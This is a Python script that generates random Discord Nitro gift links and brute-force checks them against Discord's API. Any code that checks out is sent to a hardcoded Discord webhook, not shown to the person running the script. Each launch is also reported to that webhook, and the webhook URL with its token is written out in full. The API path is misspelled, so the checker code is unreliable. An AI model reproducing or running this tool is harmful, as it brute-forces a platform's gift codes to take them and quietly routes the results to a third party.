import random, string
import requests
import colorama
import datetime
import discord
from dhooks import Webhook
import threading
colorama.init()

def sendWebhook(link):
  Found =  discord.Color.from_rgb(255, 51, 255)
  webhook = "https://discord.com/api/webhooks/1051796221636919357/qM4o827kDg2ThKoqCVVEx1-lCs7vpFNPopzioY8RX_nyzPwyUyBO8DlrreVj39yjMkqg"

  hook = Webhook(webhook)

  embed = discord.Embed(
  description = "Nitro Located!",
  color=Found,
  timestamp=datetime.datetime.utcnow(),

  )
  embed.set_author(name="V4C Scanner")
  embed.add_field(name="Link: ", value=str(link))
  hook.send(embed=embed)

def onReady(amount):
  onReady = discord.Color.from_rgb(37, 114, 68)

  #Webhook has been deleted
  webhook = "https://discord.com/api/webhooks/1051796221636919357/qM4o827kDg2ThKoqCVVEx1-lCs7vpFNPopzioY8RX_nyzPwyUyBO8DlrreVj39yjMkqg"

  hook = Webhook(webhook)

  embed = discord.Embed(
  description = "V4C Booted Up by some random!",
  color=onReady,
  timestamp=datetime.datetime.utcnow(),

  )
  embed.set_author(name="V4C Scanner")
  embed.add_field(name="Gen Amount: ",value=str(amount))
  hook.send(embed=embed)

  

print("""
 _   _    ___  _____   _____              
| | | |  /   |/  __ \ |  __ \             
| | | | / /| || /  \/ | |  \/  ___  _ __  
| | | |/ /_| || |     | | __  / _ \| '_ \ 
\ \_/ /\___  || \__/\ | |_\ \|  __/| | | |
 \___/     |_/ \____/  \____/ \___||_| |_|
                                          
                                          
""")

num=input("[?] Input How Many Codes You Want To Generate And Check: ")
onReady(num)
f=open("Nitro Test.txt", "w", encoding='utf-8')

print("""
   ___                          _   _             
  / _ \___ _ __   ___ _ __ __ _| |_(_)_ __   __ _ 
 / /_\/ _ \ '_ \ / _ \ '__/ _` | __| | '_ \ / _` |
/ /_\\  __/ | | |  __/ | | (_| | |_| | | | | (_| |
\____/\___|_| |_|\___|_|  \__,_|\__|_|_| |_|\__, |
                                            |___/ 
""")

for n in range(int(num)):
    y = ''.join(random.choice(string.ascii_uppercase + string.digits + string.ascii_lowercase) for _ in range(16))
    f.write('https://discord.gift/')
    f.write(y)
    f.write("\n")

f.close()

#checker

with open("Nitro Test.txt") as f:
    for line in f:
        nitro = line.strip("\n")

        url = "https://discordapp.com/api/v6/entitelemnts/gift-codes/" + nitro + "?with_application=false&with_subscription_plan=true"

        r = requests.get(url)

        if r.status_code == 200:
          sendWebhook(line.strip("\n"))
          
  
        else:
            print("\033[31m" + " Invalid Code Found > {}".format(line.strip("\n")))
            print("\033[37m")